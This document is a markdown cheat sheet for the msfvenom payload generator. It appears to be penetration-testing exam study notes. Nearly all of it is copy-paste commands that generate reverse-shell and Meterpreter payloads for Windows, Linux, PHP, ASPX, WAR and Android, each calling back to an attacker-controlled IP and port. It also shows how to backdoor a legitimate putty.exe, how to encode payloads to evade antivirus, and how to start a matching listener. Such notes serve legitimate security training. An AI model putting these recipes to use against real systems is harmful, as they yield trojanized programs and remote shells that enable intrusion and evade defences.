# msfvenom — payload generator

> **The "make me a reverse shell" tool.** Pairs with a Metasploit multi/handler on the other side. Expect Qs like "generate a Windows reverse shell as exe" or "create a PHP payload for the upload form".

**Install check (Parrot — already installed):** `msfvenom --help | head`

---

## 🎯 Cheat-flow: "What payload do I generate?"

| Target is... | Use payload | Output format |
|---|---|---|
| Windows exe download | `windows/x64/meterpreter/reverse_tcp` | `-f exe` |
| Windows 32-bit only | `windows/meterpreter/reverse_tcp` | `-f exe` |
| Linux binary | `linux/x64/meterpreter/reverse_tcp` | `-f elf` |
| PHP web upload | `php/meterpreter/reverse_tcp` | `-f raw` (.php) |
| JSP / Tomcat | `java/jsp_shell_reverse_tcp` | `-f raw` (.jsp) |
| WAR deploy (Tomcat) | `java/jsp_shell_reverse_tcp` | `-f war` |
| ASP / IIS | `windows/meterpreter/reverse_tcp` | `-f asp` |
| ASPX | `windows/x64/meterpreter/reverse_tcp` | `-f aspx` |
| Python script | `python/meterpreter/reverse_tcp` | `-f raw` (.py) |
| Bash oneliner | `cmd/unix/reverse_bash` | `-f raw` |
| Android APK | `android/meterpreter/reverse_tcp` | `-o shell.apk` |
| MacOS | `osx/x64/meterpreter/reverse_tcp` | `-f macho` |
| **Shellcode for C exploit** | `windows/x64/shell_reverse_tcp` | `-f c` |

---

## 🔑 Flags you must know cold

| Flag | Meaning |
|---|---|
| `-p <payload>` | **Payload type** (required) |
| `-l payloads` | List all payloads |
| `LHOST=<IP>` | Your callback IP |
| `LPORT=<port>` | Your callback port |
| `-f <format>` | Output format (`exe`, `elf`, `raw`, `php`, `asp`, `aspx`, `war`, `jsp`, `py`, `c`, `hex`, `macho`) |
| `-o <file>` | Write to file |
| `>` | Or redirect stdout |
| `-a <arch>` | Architecture (`x86`, `x64`, `arm`, `mips`) |
| `--platform <os>` | Platform (`windows`, `linux`, `osx`, `android`, `php`) |
| `-e <encoder>` | Encoder (e.g. `x86/shikata_ga_nai`) |
| `-i <n>` | Encoding iterations |
| `-b '\x00\x0a\x0d'` | **Bad chars** to avoid |
| `-x <template.exe>` | Inject into existing exe (template) |
| `-k` | Keep template functional (run payload in new thread) |
| `-s <bytes>` | Max payload size |
| `--smallest` | Smallest possible payload |
| `-n <nops>` | Prepend NOP sled |
| `--encrypt <cipher>` | Encrypt payload (`aes256`, `base64`, `rc4`, `xor`) |
| `--encrypt-key <k>` | Key for above |
| `-l encoders` | List encoders |
| `-l formats` | List formats |

---

## 🧪 Common payloads table (memorize)

### Windows
| Payload | Notes |
|---|---|
| `windows/meterpreter/reverse_tcp` | 32-bit meterpreter (most compatible) |
| `windows/x64/meterpreter/reverse_tcp` | 64-bit meterpreter |
| `windows/meterpreter/reverse_https` | HTTPS callback — bypasses egress filters |
| `windows/x64/meterpreter/reverse_https` | 64-bit HTTPS |
| `windows/shell/reverse_tcp` | Staged cmd.exe shell |
| `windows/shell_reverse_tcp` | **Stageless** cmd.exe shell |
| `windows/x64/shell_reverse_tcp` | 64-bit stageless cmd |
| `windows/meterpreter/bind_tcp` | Target listens, you connect |

### Linux
| Payload | Notes |
|---|---|
| `linux/x86/meterpreter/reverse_tcp` | 32-bit meterpreter ELF |
| `linux/x64/meterpreter/reverse_tcp` | 64-bit meterpreter ELF |
| `linux/x86/shell_reverse_tcp` | Stageless /bin/sh |
| `linux/x64/shell_reverse_tcp` | 64-bit stageless sh |

### Web / scripting
| Payload | Notes |
|---|---|
| `php/meterpreter/reverse_tcp` | PHP meterpreter |
| `php/meterpreter_reverse_tcp` | Stageless variant |
| `php/reverse_php` | Plain PHP reverse shell |
| `java/jsp_shell_reverse_tcp` | JSP / WAR for Tomcat |
| `java/meterpreter/reverse_tcp` | Cross-platform Java meterpreter |
| `python/meterpreter/reverse_tcp` | Python meterpreter |
| `cmd/unix/reverse_bash` | One-liner bash rev shell |
| `cmd/unix/reverse_python` | Python one-liner |
| `cmd/unix/reverse_perl` | Perl one-liner |
| `cmd/unix/reverse_netcat` | nc reverse shell |

### Mobile
| Payload | Notes |
|---|---|
| `android/meterpreter/reverse_tcp` | APK — sign before install |
| `osx/x64/meterpreter/reverse_tcp` | macOS Mach-O |

**stager (`/`) vs stageless (`_`)**: `reverse_tcp` (slash) downloads stage 2 on connect — smaller. `reverse_tcp` with underscore is all-in-one — larger but more reliable if staging breaks.

---

## 📋 Command recipes (copy-paste)

### Windows reverse TCP exe (most common)
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.2 LPORT=4444 \
  -f exe -o shell.exe
```

### Windows, encoded to dodge basic AV
```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.2 LPORT=4444 \
  -e x86/shikata_ga_nai -i 10 \
  -f exe -o shell.exe
```

### Windows injected into a legitimate template
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.2 LPORT=4444 \
  -x /usr/share/windows-binaries/putty.exe -k \
  -f exe -o putty-backdoor.exe
```

### Linux ELF reverse shell
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.2 LPORT=4444 \
  -f elf -o shell.elf
chmod +x shell.elf
```

### PHP payload for file upload vuln
```bash
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=10.10.14.2 LPORT=4444 \
  -f raw -o shell.php
# Prepend <?php tag if missing:
sed -i '1s;^;<?php ;' shell.php
```

### ASPX for IIS
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.2 LPORT=4444 \
  -f aspx -o shell.aspx
```

### JSP / WAR for Tomcat manager
```bash
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=10.10.14.2 LPORT=4444 \
  -f war -o shell.war
```

### Android APK
```bash
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=10.10.14.2 LPORT=4444 \
  -o evil.apk
```

### Shellcode (C array) for exploit dev
```bash
msfvenom -p windows/shell_reverse_tcp \
  LHOST=10.10.14.2 LPORT=4444 \
  -b '\x00\x0a\x0d' \
  -f c
```

### List helpers
```bash
msfvenom -l payloads | grep windows/x64/meterpreter
msfvenom -l encoders
msfvenom -l formats
msfvenom --list-options -p windows/x64/meterpreter/reverse_tcp
```

### Don't forget the handler!
After generating, **start a listener in msfconsole** that matches:
```bash
msfconsole -q
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 10.10.14.2
msf6 > set LPORT 4444
msf6 > exploit -j
```
See [metasploit.md](./metasploit.md) for full handler recipe.

---

## ⚠️ Gotchas

- **Arch mismatch:** Windows 64-bit target needs `windows/x64/...`. A 32-bit payload on 64-bit Windows may still work, but x64 meterpreter is more stable.
- **LHOST must be your IP**, not the target. `ip a` to confirm.
- **LPORT in handler must MATCH** the LPORT used in msfvenom. Same for PAYLOAD type.
- **PHP file needs `<?php`** at the start — msfvenom's raw PHP output sometimes omits it.
- **AV will flag plain `-f exe`.** Use `-x template` + `-k` or encode (`-e x86/shikata_ga_nai -i 10`). Encoding alone is NOT AV bypass on modern Defender — templates help more.
- **Staged payload (`/reverse_tcp`) hangs?** Try stageless (`_reverse_tcp`). Staging needs a clean TCP channel for stage 2.
- **APK install fails?** Sign it: `jarsigner -keystore ... evil.apk ...` or use `apksigner`.
- **Linux ELF won't run:** `chmod +x` first.
- **Bad chars in buffer overflow:** always set `-b` to exclude nulls and exploit-specific bad bytes.

---

## 🔗 Related

- [metasploit — msfconsole & handler](./metasploit.md)
- [Exploitation playbook](../playbooks/exploitation-playbook.md)
- [Web app question bank](../questions/by-domain/12-web-apps.md)
